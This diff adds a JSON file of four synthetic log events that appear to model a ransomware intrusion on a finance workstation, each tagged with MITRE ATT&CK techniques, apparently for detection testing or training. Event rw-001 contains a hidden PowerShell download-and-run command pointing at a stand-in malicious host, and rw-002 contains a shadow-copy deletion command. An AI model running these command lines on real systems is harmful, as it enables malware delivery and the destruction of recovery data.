@@ -1,0 +1,63 @@
+[
+  {
+    "event_id": "rw-001",
+    "timestamp": "2026-10-06T04:10:05Z",
+    "event_type": "PROCESS_SPAWN",
+    "source": "Windows-Security-4688",
+    "actor_user": "dave_finance",
+    "source_host": "WKS-FIN-09",
+    "process_name": "powershell.exe",
+    "process_command": "powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://malware-drop.ru/payload.exe' -OutFile '$env:TEMP\\locker.exe'; Start-Process '$env:TEMP\\locker.exe'\"",
+    "parent_process": "outlook.exe",
+    "details": {
+      "Tactic": "TA0002 Execution",
+      "Technique": "T1204.002 Malicious Link / Macro"
+    },
+    "raw_log": "EventID 4688: Process powershell.exe spawned by outlook.exe downloading locker.exe"
+  },
+  {
+    "event_id": "rw-002",
+    "timestamp": "2026-10-06T04:12:30Z",
+    "event_type": "PROCESS_SPAWN",
+    "source": "Windows-Security-4688",
+    "actor_user": "dave_finance",
+    "source_host": "WKS-FIN-09",
+    "process_name": "vssadmin.exe",
+    "process_command": "vssadmin.exe delete shadows /all /quiet",
+    "parent_process": "locker.exe",
+    "details": {
+      "Tactic": "TA0040 Impact",
+      "Technique": "T1490 Inhibit System Recovery"
+    },
+    "raw_log": "EventID 4688: vssadmin.exe executed with delete shadows /all /quiet by locker.exe"
+  },
+  {
+    "event_id": "rw-003",
+    "timestamp": "2026-10-06T04:13:45Z",
+    "event_type": "LOG_CLEAR",
+    "source": "Windows-Security-1102",
+    "actor_user": "dave_finance",
+    "source_host": "WKS-FIN-09",
+    "details": {
+      "Tactic": "TA0005 Defense Evasion",
+      "Technique": "T1070.001 Indicator Removal on Host"
+    },
+    "raw_log": "EventID 1102: The audit log was cleared on host WKS-FIN-09"
+  },
+  {
+    "event_id": "rw-004",
+    "timestamp": "2026-10-06T04:15:10Z",
+    "event_type": "FILE_MODIFY",
+    "source": "Endpoint-EDR-Event",
+    "actor_user": "dave_finance",
+    "source_host": "WKS-FIN-09",
+    "file_path": "C:\\Finance\\Q3_Audit.xlsx.locked",
+    "process_name": "locker.exe",
+    "details": {
+      "Tactic": "TA0040 Impact",
+      "Technique": "T1486 Data Encrypted for Impact",
+      "Entropy": 7.98
+    },
+    "raw_log": "EDR Alert: High entropy file rewrite to .locked extension by locker.exe on WKS-FIN-09"
+  }
+]
